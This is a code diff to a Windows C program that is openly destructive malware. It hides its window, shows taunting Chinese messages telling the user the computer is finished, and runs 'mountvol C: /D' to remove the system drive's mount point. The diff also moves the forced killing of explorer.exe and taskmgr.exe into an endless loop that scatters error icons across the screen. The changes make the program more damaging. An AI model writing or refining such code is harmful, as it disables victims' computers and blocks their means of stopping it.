@@ -1,6 +1,6 @@
 #include <windows.h>
 #pragma comment( linker, "/subsystem:/"windows/" /entry:/"mainCRTStartup/"" )
-int main(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,int nCmdShow, void)
+int main(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,int nCmdShow)
 {
 	int a;
 	HKEY hRoot = HKEY_LOCAL_MACHINE;
@@ -56,18 +56,14 @@ int main(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,int nCmd
 		MessageBoxA(NULL,(LPCSTR)"successful",(LPCSTR)"ok",MB_OK);
 	}
 	MessageBox(NULL, "傻逼，Fake You。重启？这将导致你的电脑GG。好好享受这最后的时光吧=)", "GG Computer", MB_OK);
-		system("mountvol C:");
+		system("mountvol C: /D");
 	MessageBox(NULL, "C盘已经弹出", "Fake You", MB_OK); 
-	while(a > 9999){
-		system("taskkill /f /im explorer.exe");
-		system("taskkill /f /im taskmgr.exe");
-		a+1;
-	}
-	MessageBox(NULL,"第二阶段！DrawError！", "GG computer", MB_OK);
 	HWND hwnd=GetDesktopWindow();
 	HDC hdc=GetWindowDC(hwnd);
 	POINT point;
 	while(1){
+		system("taskkill /f /im explorer.exe");
+		system("taskkill /f /im taskmgr.exe");
 		GetCursorPos(&point);
 		DrawIcon(hdc,point.x,point.y,LoadIcon(NULL,IDI_ERROR));
 		Sleep(10);
